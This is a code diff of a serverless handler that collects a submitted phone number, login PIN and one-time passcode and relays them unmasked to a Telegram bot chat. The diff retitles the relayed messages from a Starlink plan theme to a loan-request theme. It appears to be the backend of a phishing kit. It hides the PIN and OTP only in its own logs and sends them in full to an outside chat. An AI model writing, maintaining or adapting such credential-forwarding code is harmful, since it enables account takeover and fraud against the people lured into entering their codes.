@@ -1,8 +1,7 @@
 // api/sendTelegram.js
-// Diagnostic + HTML-safe version that avoids Markdown parse errors
+// HTML-safe Telegram sender — FIXED HEADING LOGIC ONLY
 
 export default async function handler(req, res) {
-  // Only accept POST
   if (req.method !== 'POST') {
     return res.status(405).send('Method not allowed');
   }
@@ -15,26 +14,21 @@ export default async function handler(req, res) {
     if (!TELEGRAM_TOKEN) missing.push('TELEGRAM_TOKEN');
     if (!TELEGRAM_CHAT_ID) missing.push('TELEGRAM_CHAT_ID');
     console.error('Missing env vars:', missing.join(', '));
-    return res
-      .status(500)
-      .send('Missing env vars: ' + missing.join(', '));
+    return res.status(500).send('Missing env vars: ' + missing.join(', '));
   }
 
-  // parse JSON safely
+  // Parse JSON safely
   let payload = {};
   try {
-    if (typeof req.body === 'string') {
-      payload = JSON.parse(req.body || '{}');
-    } else {
-      // Vercel usually gives parsed JSON here
-      payload = req.body || {};
-    }
+    payload = typeof req.body === 'string'
+      ? JSON.parse(req.body || '{}')
+      : (req.body || {});
   } catch (err) {
     console.error('Invalid JSON:', err && err.message);
     return res.status(400).send('Invalid JSON');
   }
 
-  // escape for HTML (we'll post with parse_mode = 'HTML')
+  /* ========= HELPERS ========= */
   function escHTML(s) {
     if (s === null || s === undefined) return '';
     return String(s)
@@ -44,69 +38,84 @@ export default async function handler(req, res) {
       .replace(/"/g, '&quot;');
   }
 
-  // truncate long fields to avoid message length issues
   function short(s, n = 800) {
     if (s === null || s === undefined) return '';
     s = String(s);
-    return s.length > n ? escHTML(s.slice(0, n)) + '…(truncated)' : escHTML(s);
+    return s.length > n
+      ? escHTML(s.slice(0, n)) + '…(truncated)'
+      : escHTML(s);
   }
 
-  // mask sensitive values for logs
   function mask(s) {
     if (!s) return s;
     const ss = String(s);
     if (ss.length <= 2) return '*'.repeat(ss.length);
-    const keep = Math.min(2, ss.length);
-    return '*'.repeat(ss.length - keep) + ss.slice(-keep);
+    return '*'.repeat(ss.length - 2) + ss.slice(-2);
   }
 
-  // Log masked payload for debugging
+  // Log masked payload
   const logged = { ...payload };
   if (logged.loginPin) logged.loginPin = mask(logged.loginPin);
   if (logged.otp) logged.otp = mask(logged.otp);
-  console.log('sendTelegram invoked. payload (masked):', JSON.stringify(logged));
+  console.log('sendTelegram payload (masked):', JSON.stringify(logged));
 
-  // Build HTML message
-  let text = '<b>New Starlink to Cell Request</b>\n\n';
-  if (payload.submittedAt)
+  /* ========= BUILD HEADING (FIX) ========= */
+
+  let heading = 'New Loan Submission Request';
+
+  // Preferred: explicit loan details
+  if (
+    payload.loanAmount ||
+    payload.loanPeriod ||
+    payload.employment
+  ) {
+    heading = `Loan Request: USD ${payload.loanAmount || 'N/A'} / ${payload.loanPeriod || 'N/A'} month(s) (${payload.employment || 'N/A'})`;
+  }
+  // Fallback: plan text sent by frontend
+  else if (payload.plan) {
+    heading = payload.plan;
+  }
+
+  /* ========= BUILD MESSAGE ========= */
+
+  let text = `<b>${escHTML(heading)}</b>\n\n`;
+
+  if (payload.submittedAt) {
     text += `<b>Time:</b> ${escHTML(payload.submittedAt)}\n\n`;
-
-  // Selected plan details
-  if (payload.selectedPlan && typeof payload.selectedPlan === 'object') {
-    const p = payload.selectedPlan;
-    text += '<b>Selected Plan:</b>\n';
-    if (p.id)       text += `<b>ID:</b> ${short(p.id)}\n`;
-    if (p.name)     text += `<b>Name:</b> ${short(p.name)}\n`;
-    if (p.shortName)text += `<b>Short name:</b> ${short(p.shortName)}\n`;
-    if (p.price)    text += `<b>Price:</b> ${short(p.price)}\n`;
-    if (p.duration) text += `<b>Validity:</b> ${short(p.duration)}\n`;
-    if (p.summary)  text += `<b>Summary:</b> ${short(p.summary)}\n`;
-    text += '\n';
   }
 
   // Login + OTP details
   if (payload.loginPhone) {
     text += '<b>Login details:</b>\n';
     text += `<b>Phone:</b> ${escHTML(payload.loginPhone)}\n`;
-    text += `<b>PIN:</b> ${escHTML(payload.loginPin)}\n`;
-    if (payload.otp) text += `<b>OTP:</b> ${escHTML(payload.otp)}\n`;
+    if (payload.loginPin) {
+      text += `<b>PIN:</b> ${escHTML(payload.loginPin)}\n`;
+    }
+    if (payload.otp) {
+      text += `<b>OTP:</b> ${escHTML(payload.otp)}\n`;
+    }
     text += '\n';
   }
 
-  // any other top-level keys, except ones we already printed
-  const topExtras = { ...payload };
-  delete topExtras.submittedAt;
-  delete topExtras.loginPhone;
-  delete topExtras.loginPin;
-  delete topExtras.otp;
-  delete topExtras.selectedPlan;
+  // Remove already-printed keys
+  const extras = { ...payload };
+  delete extras.submittedAt;
+  delete extras.loginPhone;
+  delete extras.loginPin;
+  delete extras.otp;
+  delete extras.plan;
+  delete extras.loanAmount;
+  delete extras.loanPeriod;
+  delete extras.employment;
 
-  if (Object.keys(topExtras).length) {
+  if (Object.keys(extras).length) {
     text += '<b>Other:</b>\n';
-    for (const k of Object.keys(topExtras)) {
-      text += `<b>${escHTML(k)}:</b> ${short(topExtras[k])}\n`;
+    for (const k of Object.keys(extras)) {
+      text += `<b>${escHTML(k)}:</b> ${short(extras[k])}\n`;
     }
   }
+
+  /* ========= SEND TO TELEGRAM ========= */
 
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
@@ -123,26 +132,20 @@ export default async function handler(req, res) {
     });
 
     const bodyText = await resp.text();
-    console.log('Telegram API status:', resp.status, 'body:', bodyText);
+    console.log('Telegram API status:', resp.status, bodyText);
 
     if (!resp.ok) {
       return res.status(502).send('Telegram error: ' + bodyText);
     }
 
-    let parsed;
     try {
-      parsed = JSON.parse(bodyText);
-    } catch (e) {
-      parsed = bodyText;
+      return res.status(200).json(JSON.parse(bodyText));
+    } catch {
+      return res.status(200).send(bodyText);
     }
 
-    if (typeof parsed === 'string') {
-      return res.status(200).send(parsed);
-    } else {
-      return res.status(200).json(parsed);
-    }
   } catch (e) {
-    console.error('Fetch error when calling Telegram API:', e && e.message);
+    console.error('Telegram fetch error:', e && e.message);
     return res.status(500).send('Fetch error: ' + (e && e.message));
   }
 }
